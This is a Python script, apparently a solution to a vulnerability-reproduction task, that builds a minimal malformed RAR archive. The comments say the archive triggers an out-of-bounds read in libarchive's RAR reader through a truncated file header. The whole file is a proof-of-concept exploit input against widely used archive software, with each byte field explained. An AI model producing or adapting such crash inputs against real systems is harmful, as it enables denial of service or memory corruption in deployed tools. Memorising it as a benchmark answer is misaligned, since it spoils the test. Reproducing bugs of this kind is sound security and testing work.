import struct
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: libarchive Heap Buffer Overflow (RAR reader).
        The vulnerability allows malformed input to cause OOB reads or negative offset calculations.
        Constructing a minimal RAR file with a truncated File Header triggers the issue.
        """
        
        # RAR Signature (7 bytes)
        # 52 61 72 21 1A 07 00
        sig = b'\x52\x61\x72\x21\x1A\x07\x00'
        
        # Main Header (Type 0x73) - 13 bytes total
        # CRC (2) + Body (11)
        # Body: Type(1), Flags(2), HeadSize(2), Reserved(6)
        mh_body = (
            b'\x73'             # Type: MAIN_HEAD
            b'\x00\x00'         # Flags
            b'\x0d\x00'         # HeadSize: 13 bytes
            b'\x00\x00'         # Reserved (HighPosAV)
            b'\x00\x00\x00\x00' # Reserved (PosAV)
        )
        mh_crc = binascii.crc32(mh_body) & 0xFFFF
        mh = struct.pack('<H', mh_crc) + mh_body
        
        # File Header (Type 0x74) - 26 bytes total
        # CRC (2) + Body (24)
        # We craft a File Header with HeadSize=26 but the file ends immediately after the partial body.
        # This causes the parser to read 'NameSize' (2 bytes) from past the end of the buffer.
        # Body: Type(1), Flags(2), HeadSize(2), PackSize(4), UnpSize(4), HostOS(1), FileCRC(4), FileTime(4), UnpVer(1), Method(1)
        # Total Body Bytes: 1+2+2+4+4+1+4+4+1+1 = 24 bytes.
        # The parser expects NameSize at offset 24 relative to body start (offset 26 relative to header start).
        # Since we only provide 24 bytes of body, reading at 24 is OOB.
        fh_body = (
            b'\x74'             # Type: FILE_HEAD
            b'\x00\x00'         # Flags
            b'\x1a\x00'         # HeadSize: 26 bytes
            b'\x00\x00\x00\x00' # PackSize
            b'\x00\x00\x00\x00' # UnpSize
            b'\x00'             # HostOS
            b'\x00\x00\x00\x00' # FileCRC
            b'\x00\x00\x00\x00' # FileTime
            b'\x00'             # UnpVer
            b'\x00'             # Method
        )
        fh_crc = binascii.crc32(fh_body) & 0xFFFF
        fh = struct.pack('<H', fh_crc) + fh_body
        
        # Total Length: 7 + 13 + 26 = 46 bytes
        return sig + mh + fh
